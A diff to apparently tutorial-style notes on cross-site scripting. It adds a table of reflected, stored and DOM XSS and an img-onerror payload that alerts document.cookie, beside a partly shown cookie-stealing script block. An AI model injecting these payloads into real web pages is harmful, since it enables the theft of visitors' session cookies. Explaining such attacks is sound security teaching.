@@ -1,5 +1,11 @@
 
-Cross Site Scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker is able to inject malicious scripts into a legitimate website or web application, which can then be executed by unsuspecting users. 
+Cross Site Scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker is able to inject malicious scripts into a legitimate website or web application, which can then be executed by unsuspecting users.  `XSS` is very similar to `HTML Injection` in practice. However, `XSS` involves the injection of `JavaScript` code to perform more advanced attacks on the client-side, instead of merely injecting HTML code. There are three main types of `XSS`:
+
+|Type|Description|
+|---|---|
+|`Reflected XSS`|Occurs when user input is displayed on the page after processing (e.g., search result or error message).|
+|`Stored XSS`|Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).|
+|`DOM XSS`|Occurs when user input is directly shown in the browser and is written to an `HTML` DOM object (e.g., vulnerable username or page title).|
 
 XSS attacks can be used to steal sensitive information, such as login credentials or personal data, from users who visit the compromised site. They can also be used to deface websites, redirect users to malicious sites, or perform other malicious activities.
 
@@ -22,7 +28,7 @@ XSS attacks can be used to steal sensitive information, such as login credential
 
 ## Stealing Cookies
 
-```
+```html
 <html>
 <body>
 <script>
@@ -32,6 +38,10 @@ r.send();
 </script>
 </body>
 </html>
+```
+
+```javascript
+#"><img src=/ onerror=alert(document.cookie)>
 ```
 
 Sending this HTML to the website which will display it will steal the cookie from any user who views it.
